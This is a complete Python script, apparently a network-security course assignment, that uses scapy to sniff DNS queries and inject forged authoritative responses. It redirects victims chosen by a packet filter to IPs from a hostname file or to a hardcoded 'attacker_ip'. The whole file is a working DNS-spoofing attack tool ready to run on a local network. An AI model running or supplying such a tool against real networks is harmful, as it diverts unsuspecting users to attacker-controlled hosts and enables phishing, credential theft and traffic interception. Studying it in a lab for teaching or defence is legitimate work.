from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf, sendp, Ether
import sys, getopt

def usage():
    """
    Print usage instructions for running the script.
    """
    print("usage: dnspoison.py [-i interface] [-f hostnames] [expression]")
    print("optional arguments:")
    print("  -h help        Show help message")
    print("  -i interface   Listen on network device <interface> (e.g., eth0). If not ")
    print("                 specified, the program should select a default interface to ")
    print("                 listen on. The same interface should be used for packet ")
    print("                 injection.")
    print("  -f hostnames   Read a file containing IP address and hostname pairs specifying the ")
    print("                 hostnames to be hijacked. If '-f' is not specified, dnspoison ")
    print("                 should forge replies to all observed requests with the local ")
    print("                 machine's IP address as an answer. ")
    print("  expression     BPF filter that specifies a subset of the traffic to be")
    print("                 monitored. This option is userful for targeting a single")
    print("                 victim or a group of victims. ")
    sys.exit(2)

def get_arguments():
    """
    Parse command line arguments and return:
    - iface: interface name
    - file: path to hostnames file
    - expr: BPF filter string
    """
    iface, hnames, expr = '', '', ''
    try:
        options, remainder = getopt.getopt(sys.argv[1:], "hi:f:e", ['iface=', 'hnames=',])
        for opt, arg in options:
            if opt == '-h':
                usage()
            if opt == '-i':
                iface = arg
            if opt == '-f':
                hnames = arg
        expr = ' '.join(remainder)
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(2)

    return iface, hnames, expr

# Global variables
dns_map = {}  # hostname -> spoofed IP
file = None
attacker_ip = "165.22.4.26"  # Do not change it

def file_to_dict(file):
    """
    Read hostnames file and build a mapping: hostname -> IP
    Example line in file: 1.2.3.4 www.google.com
    """
    global dns_map
    try:
        with open(file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split()
                if len(parts) < 2:
                    continue
                ip = parts[0]
                hostname = parts[1].rstrip('.')  # normalize
                dns_map[hostname] = ip
    except Exception as e:
        print(f"Error reading hostnames file {file}: {e}")
        sys.exit(1)


def dns_spoof(pkt):
    """
    Callback function triggered when a DNS query is sniffed.
    Decide whether to spoof and send a fake response.
    """
    if pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[DNS].qr == 0: #qr=0 means query and qr=1 means response
        qname = pkt[DNS].qd.qname.decode().rstrip('.')
        if dns_map:
            if qname not in dns_map:
                return
            ipaddr = dns_map[qname]
        else:
            ipaddr = attacker_ip
        print(f"[+] Spoofing response for {qname} -> {ipaddr}")
        create_and_send(pkt, ipaddr)

def create_and_send(pkt, ipaddr):
    """
    1. Build a fake DNS response packet 
    2. Clean up length and checksum (let scapy auto-fill)
    3. Send it back to the victim.
    """
    ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src) # we want the fake packet to go back to the victim, but look like it came from the DNS server
    udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    dns_layer = DNS(
        id=pkt[DNS].id,
        qr=1,
        aa=1,
        qd=pkt[DNS].qd,
        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=ipaddr)
    )
    spoofed_pkt = ip_layer / udp_layer / dns_layer
    sendp(Ether()/spoofed_pkt, verbose=0, iface=current_iface)

def sniff_pkts(iface, bpf):
    """
    Start sniffing packets on the network and apply DNS spoofing logic.
    """
    global current_iface
    current_iface = iface if iface else conf.iface
    filter_str = 'udp port 53'
    if bpf:
        filter_str += ' and ' + bpf
    print(f"[*] Listening on {current_iface}, filter='{filter_str}'")
    sniff(iface=current_iface, filter=filter_str, prn=dns_spoof, store=0)


# ========== Main Program ==========

iface, file, bpf = get_arguments()

if file:
    file_to_dict(file)

sniff_pkts(iface, bpf)